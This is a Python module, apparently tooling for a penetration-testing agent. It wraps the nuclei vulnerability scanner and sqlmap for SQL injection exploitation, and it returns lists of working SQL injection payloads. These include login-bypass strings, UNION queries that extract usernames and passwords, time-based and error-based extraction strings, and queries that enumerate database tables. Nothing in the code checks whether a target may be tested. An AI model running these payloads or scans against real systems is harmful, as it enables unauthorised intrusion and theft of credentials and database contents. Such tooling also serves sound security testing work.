"""Vulnerability tools — nuclei, sqlmap, sqli_payloads."""
import subprocess
import shlex


def nuclei_scan(target: str, templates: str = "", tags: str = "",
                severity: str = "") -> str:
    """Template-based vulnerability scanner."""
    cmd = f"nuclei -u {shlex.quote(target)} -silent -nc"
    if templates:
        cmd += f" -t {shlex.quote(templates)}"
    if tags:
        cmd += f" -tags {shlex.quote(tags)}"
    if severity:
        cmd += f" -severity {shlex.quote(severity)}"

    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=180)
        output = result.stdout.strip()
        if not output:
            return f"No vulnerabilities found on {target}"
        return output[:10000]
    except subprocess.TimeoutExpired:
        return "Vulnerability scan timed out"
    except Exception as e:
        return f"Error: {e}"


def sqlmap_scan(url: str, data: str = "", param: str = "",
                level: int = 1, risk: int = 1) -> str:
    """SQL injection detection and exploitation."""
    cmd = f"sqlmap -u {shlex.quote(url)} --batch --level={level} --risk={risk} --threads=4 --timeout=30"
    if data:
        cmd += f" --data={shlex.quote(data)}"
    if param:
        cmd += f" -p {shlex.quote(param)}"

    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
        return (result.stdout + result.stderr).strip()[:10000] or "No SQL injection found"
    except subprocess.TimeoutExpired:
        return "SQL injection testing timed out"
    except Exception as e:
        return f"Error: {e}"


def sqli_payloads(test_type: str = "auth_bypass", target_dbms: str = "generic") -> str:
    """Generate SQL injection test payloads."""
    payloads = {
        "auth_bypass": [
            "' OR '1'='1", "' OR '1'='1'--", "admin'--",
            "' OR 1=1--", "' OR 'x'='x", "') OR ('1'='1",
            "admin' #", "' UNION SELECT NULL--",
        ],
        "union": [
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT username,password FROM users--",
            "' UNION ALL SELECT table_name,NULL FROM information_schema.tables--",
        ],
        "blind": [
            "' AND 1=1--", "' AND 1=2--",
            "' AND SUBSTRING(@@version,1,1)='5'--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
        ],
        "time_based": [
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND SLEEP(5)--",
            "' || pg_sleep(5)--",
            "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
        ],
        "error_based": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ],
    }

    selected = payloads.get(test_type, payloads["auth_bypass"])
    lines = [f"SQL Injection Payloads ({test_type} / {target_dbms}):", ""]
    for i, p in enumerate(selected, 1):
        lines.append(f"  {i}. {p}")
    return "\n".join(lines)
